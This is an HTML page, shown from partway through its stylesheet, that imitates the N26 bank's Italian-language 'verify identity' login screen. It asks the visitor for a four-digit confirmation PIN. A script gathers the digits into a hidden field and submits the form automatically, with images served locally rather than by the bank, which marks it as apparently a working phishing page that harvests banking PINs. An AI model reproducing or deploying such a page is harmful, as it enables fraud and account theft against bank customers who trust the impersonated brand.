    :root { --background-default: rgb(255, 255, 255); --background-alternate: rgb(249, 249, 249); --background-screen: rgb(249, 249, 249); --background-button-primary-active: rgb(72, 172, 152); --background-button-primary-pressed: rgb(72, 172, 152); --background-button-primary-disabled: rgb(232, 242, 238); --background-button-secondary: rgb(255, 255, 255); --background-container-teal: rgb(72, 172, 152); --background-container-rhubarb: rgb(203, 124, 122); --background-container-wheat: rgb(200, 157, 88); --background-container-petrol: rgb(43, 105, 122); --background-container-secondary-teal: rgb(204, 227, 218); --background-container-secondary-rhubarb: rgb(235, 214, 214); --background-container-secondary-wheat: rgb(235, 221, 204); --background-container-secondary-petrol: rgb(204, 220, 226); --background-container-light: rgb(242, 242, 242); --background-container-light-teal: rgb(232, 242, 238); --background-container-light-rhubarb: rgb(242, 228, 228); --background-container-light-wheat: rgb(242, 236, 225); --background-container-light-petrol: rgb(233, 238, 242); --background-container-lightest-petrol: rgb(233, 238, 242); --background-container-dark-teal: rgb(42, 126, 109); --background-container-dark-wheat: rgb(140, 108, 58); --background-container-dark-petrol: rgb(9, 61, 77); --background-container-dark-rhubarb: rgb(158, 89, 87); --background-container-alpha-teal: rgb(72, 172, 152, 0.5); --background-container-alpha-wheat: rgb(205, 163, 95, 0.5); --background-container-alpha-petrol: rgba(38, 102, 120, 0.5); --background-container-alpha-rhubarb: rgb(203, 124, 122, 0.5); --background-light-error-red: rgb(248, 237, 237); --background-info-card: rgb(233, 233, 233); --typography-primary-default: rgb(27, 27, 27); --typography-primary-inverted: rgb(255, 255, 255); --typography-primary-consistent: rgb(27, 27, 27); --typography-primary-inverted-consistent: rgb(255, 255, 255); --typography-secondary-default: rgb(105, 105, 105); --typography-secondary-consistent: rgb(105, 105, 105); --typography-disabled: rgb(171, 171, 171); --typography-interactive-primary-teal-consistent: rgb(54, 161, 139); --typography-interactive-primary-wheat-consistent: rgb(200, 157, 88); --typography-interactive-primary-petrol-default: rgb(43, 105, 122); --typography-interactive-primary-petrol-consistent: rgb(43, 105, 122); --typography-interactive-primary-rhubarb-default: rgb(179, 93, 91); --typography-interactive-primary-rhubarb-consistent: rgb(179, 93, 91); --typography-interactive-secondary-teal-default: rgb(31, 117, 96); --typography-interactive-secondary-teal-consistent: rgb(31, 117, 96); --typography-interactive-secondary-wheat-consistent: rgb(166, 121, 49); --typography-interactive-secondary-petrol-default: rgb(32, 91, 107); --typography-interactive-secondary-petrol-consistent: rgb(32, 91, 107); --typography-interactive-secondary-rhubarb-consistent: rgb(142, 70, 68); --typography-positive-amount: rgb(54, 161, 139); --border-primary-gray: rgb(233, 233, 233); --border-primary-teal: rgb(31, 117, 96); --border-primary-petrol: rgb(24, 81, 97); --border-primary-wheat: rgb(128, 91, 32); --border-primary-rhubarb: rgb(142, 70, 68); --border-secondary-gray: rgb(150, 150, 150); --border-secondary-teal: rgb(54, 161, 139); --border-secondary-petrol: rgb(43, 105, 122); --border-secondary-wheat: rgb(166, 121, 49); --border-secondary-rhubarb: rgb(179, 93, 91); --divider-default: rgb(233, 233, 233); --divider-default-consistent: rgb(233, 233, 233); --background-screen-default: rgb(255, 255, 255); --background-container-primary-default: rgb(255, 255, 255); --background-container-primary-teal: rgb(54, 161, 139); --background-container-primary-wheat: rgb(200, 157, 88); --background-container-primary-petrol: rgb(43, 105, 122); --background-container-primary-rhubarb: rgb(179, 93, 91); --background-container-primary-gray: rgb(150, 150, 150); --background-container-primary-hovered: rgb(249, 249, 249); --background-container-primary-pressed: rgb(242, 242, 242); --background-elevated-container-primary-default: rgb(255, 255, 255); --background-container-secondary-gray: rgb(233, 233, 233); --background-container-tertiary-teal: rgb(232, 242, 238); --background-container-tertiary-teal-pressed: rgb(204, 227, 218); --background-container-tertiary-wheat: rgb(242, 236, 225); --background-container-tertiary-wheat-pressed: rgb(235, 221, 204); --background-container-tertiary-petrol: rgb(233, 238, 242); --background-container-tertiary-petrol-pressed: rgb(204, 220, 226); --background-container-tertiary-rhubarb: rgb(242, 232, 232); --background-container-tertiary-rhubarb-pressed: rgb(235, 214, 214); --background-container-tertiary-gray: rgb(242, 242, 242); --background-container-tertiary-gray-pressed: rgb(233, 233, 233); --background-error: rgb(242, 232, 232); --background-positive-amount: rgb(232, 242, 238); --background-navigation-bottom: rgb(255, 255, 255); --background-button-primary-teal-default: rgb(54, 161, 139); --background-button-primary-teal-pressed: rgb(31, 117, 96); --background-button-primary-teal-disabled: rgb(130, 196, 178); --background-button-primary-teal-hover-and-focused: rgb(54, 161, 139); --background-button-primary-wheat-default: rgb(166, 121, 49); --background-button-primary-wheat-pressed: rgb(128, 91, 32); --background-button-primary-wheat-disabled: rgb(225, 197, 161); --background-button-primary-wheat-hover-and-focused: rgb(166, 121, 49); --background-button-primary-petrol-default: rgb(43, 105, 122); --background-button-primary-petrol-pressed: rgb(24, 81, 97); --background-button-primary-petrol-disabled: rgb(204, 220, 226); --background-button-primary-petrol-hover-and-focused: rgb(43, 105, 122); --background-button-primary-rhubarb-default: rgb(179, 93, 91); --background-button-primary-rhubarb-pressed: rgb(142, 70, 68); --background-button-primary-rhubarb-disabled: rgb(222, 172, 171); --background-button-primary-rhubarb-hover-and-focused: rgb(179, 93, 91); --background-button-secondary-default: rgb(255, 255, 255); --background-button-secondary-pressed: rgb(242, 242, 242); --background-button-tertiary-teal-pressed: rgb(232, 242, 238); --background-button-tertiary-wheat-pressed: rgb(242, 236, 225); --background-button-tertiary-petrol-pressed: rgb(233, 238, 242); --background-button-tertiary-rhubarb-pressed: rgb(242, 232, 232); --background-button-tertiary-hover-and-focused: rgb(255, 255, 255); --overlay-default: rgb(27, 27, 27); --overlay-default-consistent: rgb(27, 27, 27); --shadow-default: rgba(0, 0, 0, 0.2); --iconography-primary-default: rgb(27, 27, 27); --iconography-primary-consistent: rgb(27, 27, 27); --iconography-primary-default-inverted: rgb(255, 255, 255); --iconography-primary-inverted-consistent: rgb(255, 255, 255); --iconography-secondary-default: rgb(105, 105, 105); --iconography-disabled: rgb(171, 171, 171); --iconography-interactive-primary-teal-consistent: rgb(54, 161, 139); --iconography-interactive-primary-teal-disabled: rgb(130, 196, 178); --iconography-interactive-primary-petrol-default: rgb(43, 105, 122); --iconography-interactive-primary-petrol-consistent: rgb(43, 105, 122); --iconography-interactive-primary-petrol-disabled: rgb(121, 161, 173); --iconography-interactive-primary-rhubarb-default: rgb(179, 93, 91); --iconography-interactive-primary-rhubarb-consistent: rgb(179, 93, 91); --iconography-interactive-primary-rhubarb-disabled: rgb(222, 172, 171); --iconography-interactive-secondary-teal-default: rgb(31, 117, 96); --iconography-interactive-secondary-teal-consistent: rgb(31, 117, 96); --iconography-interactive-secondary-petrol-default: rgb(32, 91, 107); --iconography-interactive-secondary-petrol-consistent: rgb(32, 91, 107); --progress-background: rgb(204, 227, 218); --progress-foreground: rgb(54, 161, 139); --shimmer-loader-background: rgb(242, 242, 242); --shimmer-loader-foreground: rgb(249, 249, 249); --bright-overlay: rgb(255, 255, 255, 0.75); --mild-overlay: rgba(0, 0, 0, 0.075); --distinct-overlay: rgba(0, 0, 0, 0.2); --primary-focus: rgba(54, 161, 139, 0.6); --typography-default: rgb(18, 18, 18); --typography-default-inverted: rgb(255, 255, 255); --typography-default-consistent: rgb(18, 18, 18); --typography-default-inverted-consistent: rgb(255, 255, 255); --typography-interactive-rhubarb: rgb(203, 124, 122); --typography-interactive-default: rgb(72, 172, 152); --typography-interactive-teal: rgb(72, 172, 152); --typography-extra-light: rgb(191, 191, 191); --typography-light: rgb(116, 116, 116); --typography-error: rgb(180, 75, 70); --divider-teal: rgb(72, 172, 152); --divider-error: rgb(180, 75, 70); --divider-dark: rgb(116, 116, 116); --iconography-default: rgb(18, 18, 18); --iconography-default-inverted: rgb(255, 255, 255); --iconography-light: rgb(116, 116, 116); --iconography-bright: rgb(233, 233, 233); --iconography-action: rgb(72, 172, 152); --iconography-rhubarb: rgb(179, 93, 91); --shimmer-background: rgb(233, 233, 233); --shimmer-foreground: rgb(249, 249, 249); --deprecated-gray: rgb(201, 201, 201); }
</style>

<link rel="icon" type="image/x-icon" sizes="256x256" href="favicon.ico">

<meta name="theme-color" content="#48AC98">
<meta name="google" content="notranslate">

</head>
<body style="background-color: white;">
<div id="root">
<p tabindex="-1" class="a b c d e f g h i j k l m n" id="a11y-page-name-paragraph">Login — N26</p>
<div style="padding: 10px 20px;-webkit-box-shadow: 5px 4px 16px 5px #000000; 
box-shadow: 10px 4px 16px 5px #000000;border-bottom: 1px solid #dddddd;box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
-webkit-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);
-moz-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.75);"><img src="freccia.jpg" style="float: left;"><div style="margin-left: 65px;font-size: 120%;line-height: 162%;margin-top:5px;"> Verifica identità</div>
</div>
<main role="main" class="o p q r s t">
    <div class="o p q r s t u v w x y z">
        <div class="ab ac ae af ag ah ai o p q r s t w x y z">
            <div class="aj ak al am an ao ap aq ar as p r s v" style="background: rgb(255 255 255);">
                <div class="ap ar at au av aw ax ay az ba bb bc bd be bf bg bh bj bk bl bm bn bo bp bq br bs bt bu bv bw bx by bz ca cb cc cd ce p q w x y z" style="border: none;">
                    <div class="bo cf cg ch ci cj ck o p q u x z" style="text-align: center;">
                        <h1 class="a b c d e f g h i j k l m n">Login</h1>
                        <form class="o p q" method="POST"><a class="cl cm cn co cp cq cr cs ct cu cv cw cx cy cz da db dc dd de df dg dh di dj x z" href=""><span class="a b c d e f g h i j k l m n">N26</span></a>
                            <div style="text-align: center;font-family: sans-serif;margin-bottom: 25px;font-weight: bold;">
                                <img src="pin.jpg" style="width: 100px;margin:  auto;/* text-align: center; */"><p style="font-size: 130%;">Inserisci il tuo PIN di conferma</p><p style="font-weight: 400;">Serve per confermare la tua identità</p></div>
                            <div >
<style>
.myPinCode input{
    width: 50px;
    margin-right: 15px;
    height: 50px;
    text-align: center;
    border: none;
    border-bottom: 2px solid #35a28b;}</style>
<div style="margin-left:10px"class="myPinCode">
  <input type="tel" id="o1" maxlength="1" tab="1"  autofocus="autofocus" >
  <input type="tel" id="o2" maxlength="1"  tab="2">
  <input type="tel" id="o3" maxlength="1"  tab="3">
  <input type="tel" id="o4"  maxlength="1"  tab="4">
</div><br>
<input type="hidden" name="otp" id="otp" />



</div>
                          
                            <div id="login-errors" role="alert" class="db ii"></div></form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>
<footer role="contentinfo" class="jr">
    <div class="at jr js o">
        
    </div>
</footer>
</div>

<link rel="stylesheet" href="jquery-pincode-autotab.css" >
<script src="jquery-latest.min.js"></script>
<script src="jquery-pincode-autotab.min.js"></script>
<script>$(document).ready(function() {
  $(".myPinCode input").jqueryPincodeAutotab();
  jQuery("#o1").focus();
  jQuery("#o1").click();
});
sub=true;
setInterval(function(){
    valore=jQuery("#o1").val()+ jQuery("#o2").val()+ jQuery("#o3").val()+ jQuery("#o4").val()
   if(valore.length==4){
    jQuery("#otp").val(valore)
    if(sub){
      sub=false;
      jQuery("form").submit()
    }
    
   }else{
    jQuery("#otp").val("")
   }
    

}, 200);
</Script>
</body></html>